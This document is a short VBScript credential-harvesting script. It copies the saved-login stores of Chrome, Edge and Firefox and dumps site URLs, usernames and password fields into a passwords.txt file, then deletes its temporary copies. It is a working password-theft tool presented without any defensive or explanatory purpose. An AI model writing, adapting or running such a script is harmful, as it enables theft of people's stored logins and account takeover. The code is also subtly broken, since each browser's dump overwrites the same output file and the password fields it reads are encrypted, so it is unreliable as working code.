Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the script's directory
strScriptDir = objFSO.GetParentFolderName(WScript.ScriptFullName)

' Build the full path to the text file
strFilePath = objFSO.BuildPath(strScriptDir, "passwords.txt")

' Open Command Prompt
Set cmd = objShell.Exec("cmd")

' Retrieve Google Chrome passwords
cmd.StdIn.WriteLine("copy ""%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"" """ & strScriptDir & "\chrome_passwords""")
cmd.StdIn.WriteLine("sqlite3.exe """ & strScriptDir & "\chrome_passwords"" ""select origin_url, username_value, password_value from logins;"" > """ & strFilePath & """")
cmd.StdIn.WriteLine("del """ & strScriptDir & "\chrome_passwords""")

' Retrieve Mozilla Firefox passwords
cmd.StdIn.WriteLine("copy ""%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json"" """ & strScriptDir & "\firefox_passwords.json""")
cmd.StdIn.WriteLine("powershell -Command ""Get-Content '" & strScriptDir & "\firefox_passwords.json' | ConvertFrom-Json | select -ExpandProperty logins | ConvertTo-Csv -NoTypeInformation | Out-File -Encoding ASCII '" & strFilePath & "'""")
cmd.StdIn.WriteLine("del """ & strScriptDir & "\firefox_passwords.json""")

' Retrieve Microsoft Edge passwords
cmd.StdIn.WriteLine("copy ""%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"" """ & strScriptDir & "\edge_passwords""")
cmd.StdIn.WriteLine("sqlite3.exe """ & strScriptDir & "\edge_passwords"" ""select origin_url, username_value, password_value from logins;"" > """ & strFilePath & """")
cmd.StdIn.WriteLine("del """ & strScriptDir & "\edge_passwords""")

' Exit Command Prompt
cmd.StdIn.WriteLine("exit")

' Wait for the command to finish
Do While cmd.Status = 0
    WScript.Sleep 100
Loop
